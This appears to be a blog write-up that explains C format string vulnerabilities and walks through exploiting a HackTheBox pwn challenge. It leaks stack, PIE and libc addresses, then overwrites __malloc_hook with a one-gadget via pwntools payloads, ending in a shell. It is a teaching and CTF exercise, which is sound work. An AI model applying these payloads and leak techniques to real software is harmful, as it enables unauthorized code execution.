---
title: "What is format strings? How do they work?"
date: 2021-09-08T15:33:45+02:00
---

# Format string: A Mini Study - with challenge
This will be a short, and practical walkthrough of the concept "format string", with an example of how to solve a format string challenge.


# Research and everything format string
Format is a pwn task on HackTheBox revolving around the idea of format strings (eg. %s, %d, %p), which is a C feature, that allows a strings to contain both words and variables in one. Like such:

```c
#include <stdio.h>

int hack_number = 1337;

int main(){
    printf("Number is: %d\n", hack_number);
}
```

This means that a string if printed and contains one of these it will print whatever the format specifies. There's a wide variety of specifiers programmers can use for this some would be:
```
%c - looks at an address and prints the char (reads one byte)
%s - looks at an address and prints the string (reads till null byte)
%d - looks at an address and prints the integer
%p - prints an address
%f - prints a float
```

Now while this might not currently seem like a security vulnerability it most definitely can become one. A common error is that a C programmer, trusts to receive a string from a user, and simply print it. This could be to receive a username, and print said username:
```c
#include <stdio.h>
#include <unistd.h>

int main(){
    char buffer[20];    
    read(0, buffer, 20); //Reads from standard input to buffer, 20 bytes

    printf(buffer); //Prints whatever lies at the address of buffer
    return 0;
}
```

Compiling the program with gcc and run it, try to send %p %p %p from stdin:
```
cave@townie:$ ./a.out 
%p %p %p %p
0x7fff5b31d0e0 0x14 0x7f695e945b82 (nil)
```

As one can see, we get a bunch of addresses. The weird thing is, that we never read any addresses into "buffer", so where are these addresses from? We are leaking values now! This is not very good, and if this is a possibility one should be very wary of the possibilities.

Imagine the following print statement:
```c
printf("num1: %d, num2: %d, num3: %d, str1: %s", num1, num2, num3, str1);
```

Let's quickly remember now, that printf is a function from libc, and we feed it the arguments of "num1, num2, num3, str1". We remember that everytime we use a function, and give it variables, these are passed on the stack. Now it makes sense why "%p %p %p %p", gives us addresses from memory!

Now %s, looks at an address, and prints the value there... Cool... and we know that segfaults are caused by a program trying to read or write from or to an illegal memory location. What would happen if we sent a lot of "%s %s ...", it would segfault!
<br>
<br>
There's also something called "Direct Parameter Access", which essentially states, that we can read anywhere, if we know the offset from where we are. That looks like this:
```
%[offset]$[type]
(eg. %4$s, %5$s, %1$s, %1337$s
```

Last but not least, format string is turing complete, which means that we can execute any calculation with it (might not be fast tho) - this leads to being able to read AND write to any point in memory, if we have a format string, and can leak memory properly, we can control overwrite everything we're allowed to. This can be done by the specifier "%n".<br><br>
But how does "%n" work? It prints nothing, and reads the characters printed before it, into an address (or rather to a pointer of a signed int):

```c
#include <stdio.h>

int main()
{
  int val;

  printf("blah %n blah\n", &val);
  printf("val = %d\n", val);
}

Output >> val = 5
```

We wont go too much into the details exactly of making a format string payload manually, because our beloved pwntools <3, has this exact feature:

```python
Python 3.9.5 (default, May 11 2021, 08:20:37) 
[GCC 10.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context.arch = "amd64"
>>> fmtstr_payload(1, {0xdeadbeef: 0xcafebabe})
b'%190c%7$lln%12c%8$hhn%52c%9$hhn%188c%10$hhnaaaab\xef\xbe\xad\xde\x00\x00\x00\x00\xf2\xbe\xad\xde\x00\x00\x00\x00\xf1\xbe\xad\xde\x00\x00\x00\x00\xf0\xbe\xad\xde\x00\x00\x00\x00'
```


# The challenge - recon
Let's start by quickly looking at the binaries security using checksec:

```
cave@townie:~/CTF/pwn/format_$ checksec format
[*] '/home/cave/CTF/pwn/format_/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Everything is on. Full RELRO means we cannot overwrite the global offset table. PIE meaning we have to leak the binary base somehow to find anything. Cool:)

The echo function just reads from stdin into a buffer, and prints that buffer without any sanity checks - this means we have a format string vulnerability.

# Game plan
Now that we know we have a format string vulnerability, we need to find out how to use it. But as we're in an infinite loop, with no ways of overwriting the global offset table, what do we overwrite?

There are two targets that's specially interesting. 

1. Overwrite the return address of printf (on the stack)
2. Overwrite what lies at "malloc hook", and then send a lot of characters so malloc will be called to allocate memory

What would we need to do each of these plans?
1. We would need to leak a stack address, then find the offset between the return of printf, and the leaked address.<br>After that we would need to leak the libc version, so that we could put a one gadget as the printf return. 
2. We would need to leak the libc address, and overwrite malloc hook with a one gadget

Now while both are definitely viable, the easier one would be to overwrite malloc hook.

Let's start by running the binary and look at the pointers we can leak:
```
cave@townie:~/CTF/pwn/format_$ ./format 
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
0x7f28befdfa23 (nil) 0x7f28bef06b82 0x7ffc6df46b50 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x20702520702520 (nil) 0xa8716b068a2d4d00 0x7ffc6df46c80 0x558aecf6c2b3 0x7ffc6df46d70 0xa8716b068a2d4d00 (nil) 0x7f28bee27565 0x7ffc6df46d78 0x16dfe8000 0x558aecf6c284 0x7ffc6df47059 0x558aecf6c2d0 0x6abbc2b8a3ffaee0 0x558aecf6c0c0 (nil) (nil) (nil) 0x954319507adfaee0 0x94eabf7c49cbaee0 (nil) (nil) (nil) 0x1 0x7ffc6df46d78 0x7ffc6df46d88 0x7f28bf036220 (nil) (nil) 0x558aecf6c0c0 0x7ffc6df46d70 (nil) (nil) 0x558aecf6c0ee 0x7ffc6df46d68 0x1c 0x1 0x7ffc6df4732a (nil) 0x7ffc6df47333 0x7ffc6df47343 0x7ffc6df47395 0x7ffc6df473a8 0x7ffc6df473bc 0x7ffc6df473eb 0x7ffc6df47425 0x7ffc6df47446 0x7ffc6df47472 0x7f28befdfa23 (nil) 0x7f28bef06b82 0x7ffc6df46b50 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520000a20 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 
```


Now let's quickly open in gdb and run "vmmap", to see which addresses look like code and which looks like stack:
```
    0x555555554000     0x555555555000 r--p     1000 0      /home/cave/CTF/HTB/pwn/format_/format
    0x555555555000     0x555555556000 r-xp     1000 1000   /home/cave/CTF/HTB/pwn/format_/format
    0x555555556000     0x555555557000 r--p     1000 2000   /home/cave/CTF/HTB/pwn/format_/format
    0x555555557000     0x555555558000 r--p     1000 2000   /home/cave/CTF/HTB/pwn/format_/format
    0x555555558000     0x555555559000 rw-p     1000 3000   /home/cave/CTF/HTB/pwn/format_/format
    0x7ffff7dbf000     0x7ffff7dc1000 rw-p     2000 0      anon_7ffff7dbf
    0x7ffff7dc1000     0x7ffff7de7000 r--p    26000 0      /usr/lib/x86_64-linux-gnu/libc-2.33.so
    0x7ffff7de7000     0x7ffff7f52000 r-xp   16b000 26000  /usr/lib/x86_64-linux-gnu/libc-2.33.so
    0x7ffff7f52000     0x7ffff7f9e000 r--p    4c000 191000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
    0x7ffff7f9e000     0x7ffff7fa1000 r--p     3000 1dc000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
    0x7ffff7fa1000     0x7ffff7fa4000 rw-p     3000 1df000 /usr/lib/x86_64-linux-gnu/libc-2.33.so
    0x7ffff7fa4000     0x7ffff7faf000 rw-p     b000 0      anon_7ffff7fa4
    0x7ffff7fc3000     0x7ffff7fc7000 r--p     4000 0      [vvar]
    0x7ffff7fc7000     0x7ffff7fc9000 r-xp     2000 0      [vdso]
    0x7ffff7fc9000     0x7ffff7fca000 r--p     1000 0      /usr/lib/x86_64-linux-gnu/ld-2.33.so
    0x7ffff7fca000     0x7ffff7ff1000 r-xp    27000 1000   /usr/lib/x86_64-linux-gnu/ld-2.33.so
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000 28000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000 31000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000 33000  /usr/lib/x86_64-linux-gnu/ld-2.33.so
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]

```

So addresses with 0x7fff are stack addresses, and 0x555 addresses are code. We can see the following addresses, we see three addresses that looks like code. Let's pick one and look in gdb
```
0x558aecf6c284 0x7ffc6df47059 0x558aecf6c2d0 0x6abbc2b8a3ffaee0 0x558aecf6c0c0 (nil) (nil) (nil)
```

So one of the addresses is at the offset 35, meaning we can access it with direct parameter accessing: %35$p (this is on remote, 34 on local for some reason) - if we look in gdb we see that the address is:
```
pwndbg> x/32wgx 0x5555555550c0
0x5555555550c0 <_start>:    0x8949ed31fa1e0ff3  0xe48348e289485ed1
0x5555555550d0 <_start+16>: 0x0266058d4c5450f0  0x0001ef0d8d480000
```

Now we just find the offset between the start and the code section, and bob's your uncle, we have the offset for the base address leaked.

Now next we need to leak the global offset table's entry for printf - we remember that %s, reads from an address and prints that, so we read from the address of the global offset table and we have leaked libc base+printf offset. We can test which parameter access we need to use manually:
```
cave@townie:~/CTF/pwn/format_$ ./format
aaaabbbb %8$p i AAAAAAAA
aaaabbbb 0x4141414141414141 i AAAAAAAA
```

Now we use this info to leak printf (We put the address of prints GOT entry instead of the 8 capital A's) - after that we use a libc database to find out which libc is running remotely. Last but not least, we need to make the actual write with format string.

```python
payload = fmtstr_payload(6, {__malloc_hook: one_gd})
```

I'm not completely sure why it has to be 6, but it's something about you controlling that parameter:
```
AAAAiiii %6$p
AAAAiiii 0x6969696941414141
```

And then we just send it! And send a ton of characters to call malloc to get space for them, and boom:

```python3
[*] '/home/cave/CTF/pwn/format_/solve1_malloc_hook/format'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenge on port 80085: Done
[+] Start: 0x55661cfd20c0
[*] Base: 0x55661cfd1000
printf got 0x55661cfd4fc0
[-] Leaked printf got: 0x7fe98b203e80
[-] Leaked libc: 0x7fe98b19f000
b'%140c%15$lln%c16$hhn%86c%17$hhn%618$hhn%85c%19$hhn%12c%20$hhnaaaaba0\xacX\x8b\xe9\x7f\x00\x001\xacX\x8b\xe9\x7f\x00\x004\xacX\x8b\xe9\x7f\x00\x002\xacX\x8b\xe9\x7f\x00\x005\xacX\x8b\xe9\x7f\x00\x003\xacX\x8b\xe9\x7f\x00\x00'
/home/cave/CTF/pwn/format_/solve1_malloc_hook/sol.py:92: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  io.sendline(payload)
[*] Switching to interactive mode
                                                                                                                                           p      \xd0                                                                                     \x81                                                                \xc0                                                                                    \xc0           %aaaaba0ls
flag.txt
format
run_challenge.sh
```
